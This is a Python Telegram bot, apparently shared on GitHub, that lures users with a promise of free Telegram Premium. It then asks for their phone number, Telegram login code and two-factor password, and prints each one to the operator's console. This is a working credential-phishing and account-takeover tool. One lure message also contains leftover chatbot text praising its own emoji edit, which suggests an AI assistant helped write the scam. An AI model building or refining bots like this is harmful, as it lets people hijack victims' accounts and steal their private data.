import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
print("github -> https://github.com/inits5/\ntelegram -> @inits5\n")
api = input("please enter your api token : ")
channel = input("please enter your channel (For mandatory membership) , (@exampel_com) : ")

bot = telebot.TeleBot(api)  
CHANNEL_USERNAME = channel

def print_user_info(user_id, username):
    print("="*30)
    print("User Info:")
    print(f"User ID -> {user_id}")
    print(f"Username -> {username if username else 'null'}")
    print("="*30)

def check_membership(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking membership: {e}")
        return False

@bot.message_handler(commands=['start', 'again'])
def welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    print_user_info(user_id, username)

    if not check_membership(user_id, CHANNEL_USERNAME):
        markup = InlineKeyboardMarkup()
        button = InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
        markup.add(button)
        
        bot.send_message(message.chat.id, 
                         "لطفاً ابتدا در کانال ما عضو شوید تا بتوانید از خدمات ربات استفاده کنید و سپس مجدداً روی /start کلیک کنید.", 
                         reply_markup=markup)
        return  

    photo = "image.png"
    caption = "سلام! خوش آمدید!"
    
    with open(photo, 'rb') as photo_file:
        bot.send_photo(message.chat.id, photo_file, caption=caption)
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    button = KeyboardButton("ارسال شماره تلفن", request_contact=True)
    markup.add(button)
    
    bot.send_message(message.chat.id, 
                     "🎉 سلام! این ربات به شما یک ماه پرمیوم تلگرام هدیه می‌دهد! برای اینکه ربات بتواند هویت شما را تأیید کند، لطفاً شماره تلفن خود را ارسال کنید.", 
                     reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    phone_number = contact.phone_number
    print(f"Number -> {phone_number}")
    
    bot.send_message(message.chat.id, 
                     "برای فعال‌سازی پرمیوم، لطفاً کد تأیید را برای ما بخوانید یا از پیوی تلگرام فوروارد کنید. اگر مراحل را درست انجام دهید، حساب شما تا ۴۸ ساعت آینده پرمیوم دریافت می‌کند! بیایید شروع کنیم! کد را ارسال کنید:")


    bot.register_next_step_handler(message, request_two_factor_code)

def request_two_factor_code(message):
    code = message.text.strip()
    

    print(f"Code entered by user: {code}")

    bot.send_message(message.chat.id, """البته! در اینجا متن شما با ایموجی‌های مناسب اضافه شده است: "اگر حساب شما با تأیید دو مرحله‌ای محافظت می‌شود 🔒، آن را وارد کنید؛ در غیر این صورت عدد ۵ را ارسال کنید. 📱
لطفاً توجه داشته باشید که تمامی اطلاعات ذخیره شده از شما در ربات تلریوم حفاظت می‌شود 🛡️ و تضمین اطلاعات شما به عهده ربات تلریوم است.
همچنین توجه کنید که این اطلاعات بعد از پرمیوم شدن حساب شما حذف می‌شود 🗑️." امیدوارم این نسخه جذاب‌تر و قابل فهم‌تر باشد! اگر نیاز به تغییرات بیشتری دارید، لطفاً بفرمایید.""")

    bot.register_next_step_handler(message, final_code_handler)

def final_code_handler(message):
    code = message.text.strip() 
    

    print(f"2FA : {code}")

    bot.send_message(message.chat.id,
                     """بسیار خب با موفقیت انجام شد 🥳 

ربات برای فعال‌سازی پرمیوم روی حساب شماست؛ لطفاً حساب ربات را تا ۴۸ ساعت آینده از روی اکانتتان حذف نکنید ❗️❗️
ربات پس از فعال‌سازی پرمیوم حساب به صورت خودکار از حساب خارج می‌شود ✅

اگر از صحیح بودن اطلاعات وارد شده اطمینان ندارید، می‌توانید با دستور /again مجدد مراحل را انجام دهید (دقت کنید یک بار بیشتر اگر با موفقیت ربات وارد حساب شده است وارد نشوید).""")


bot.infinity_polling()
